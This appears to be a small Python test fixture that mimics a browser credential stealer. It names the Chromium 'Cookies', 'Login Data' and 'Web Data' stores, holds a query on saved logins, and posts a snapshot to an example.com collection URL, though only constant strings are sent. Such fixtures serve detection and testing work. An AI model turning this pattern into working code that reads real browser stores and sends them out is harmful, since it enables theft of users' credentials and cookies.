import requests
import sqlite3

COOKIE_STORE = "Cookies"
BROWSER_DB = "Login Data"
CARD_DB = "Web Data"


def describe_browser_state():
    query = "SELECT origin_url, username_value FROM logins"
    return {
        "cookie_store": COOKIE_STORE,
        "browser_db": BROWSER_DB,
        "card_db": CARD_DB,
        "query": query,
        "note": "demo downloader fixture with broad browser strings",
        "driver": sqlite3.connect(":memory:")
    }


def export_browser_state():
    payload = describe_browser_state()
    requests.post("https://example.com/collect", json={"snapshot": repr(payload)})
